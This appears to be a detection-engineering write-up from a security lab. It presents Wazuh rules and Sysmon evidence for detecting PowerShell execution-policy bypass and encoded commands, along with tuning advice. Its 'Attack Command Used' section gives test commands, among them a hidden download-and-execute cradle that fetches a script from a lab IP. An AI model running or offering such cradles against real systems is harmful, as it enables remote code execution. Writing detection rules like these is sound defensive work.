# Detection: PowerShell Execution Policy Bypass

## Threat Description

Adversaries frequently invoke `powershell.exe` with `-ExecutionPolicy Bypass` to circumvent script execution restrictions on Windows endpoints. This is a standard initial step in post-exploitation frameworks (Cobalt Strike, Empire, Metasploit) and living-off-the-land attack chains. Encoded command execution (`-EncodedCommand` / `-enc`) is also used to obfuscate malicious payloads.

While bypassing execution policy is trivial and not a security boundary (Microsoft documents this), its presence in command-line arguments is a reliable behavioral indicator of non-standard PowerShell usage.

## MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| **Tactic** | Execution |
| **Technique** | T1059.001 — Command and Scripting Interpreter: PowerShell |
| **Sub-technique** | N/A |

## Data Source

- **Sysmon Event ID 1** — Process Creation
- **Key Fields:** `Image`, `CommandLine`, `ParentImage`, `User`
- **Log Channel:** `Microsoft-Windows-Sysmon/Operational`

## Detection Logic

The rule triggers when Sysmon Event ID 1 captures a `powershell.exe` process creation where the `CommandLine` field contains `-ExecutionPolicy Bypass`, `-ep bypass`, or `-EncodedCommand`. Multiple command-line variations are covered to account for abbreviation and case differences.

The rule evaluates:
1. Event type is Sysmon Event ID 1 (process creation)
2. Image path ends with `powershell.exe`
3. CommandLine contains execution policy bypass flags or encoded command indicators

## Wazuh Rule

See [wazuh-rules/powershell.xml](wazuh-rules/powershell.xml)

```xml
<group name="sysmon,powershell,execution,T1059.001,">
  <rule id="100100" level="12">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)powershell\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(-ep\s+bypass|-executionpolicy\s+bypass)</field>
    <description>PowerShell executed with Execution Policy Bypass — T1059.001</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
    <options>no_full_log</options>
  </rule>

  <rule id="100101" level="14">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)powershell\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(-enc\s|-encodedcommand\s)</field>
    <description>PowerShell executed with Encoded Command — T1059.001</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
    <options>no_full_log</options>
  </rule>
</group>
```

## Attack Command Used

```powershell
# Execution Policy Bypass
powershell.exe -ExecutionPolicy Bypass -File C:\Temp\payload.ps1

# Encoded Command (base64-encoded "whoami")
powershell.exe -EncodedCommand dwBoAG8AYQBtAGkA

# Abbreviated flag
powershell.exe -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.100/test.ps1')"
```

## Observed Behavior in Logs

Sysmon Event ID 1 captured the following fields:

```
EventID: 1
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\Temp\payload.ps1
ParentImage: C:\Windows\System32\cmd.exe
User: LAB\jsmith
IntegrityLevel: Medium
```

Wazuh alert generated:
- **Rule ID:** 100100
- **Level:** 12
- **Description:** PowerShell executed with Execution Policy Bypass — T1059.001

The encoded command variant (rule 100101) triggered at level 14 due to higher confidence of malicious intent.

## False Positives and Tuning

**Known false positives:**
- Legitimate software installers (e.g., SCCM, Chocolatey) that invoke PowerShell with `-ExecutionPolicy Bypass` during package installation
- System administration scripts deployed via GPO that use bypass flags for automation

**Tuning recommendations:**
- Add exceptions for known parent processes (e.g., `ccmexec.exe` for SCCM) using a child rule with `<if_sid>100100</if_sid>` and level 0
- Monitor for volume — a single bypass invocation from a known admin tool is less concerning than repeated invocations from `cmd.exe` or `explorer.exe`
- The encoded command rule (100101) has a lower false positive rate and should rarely need tuning
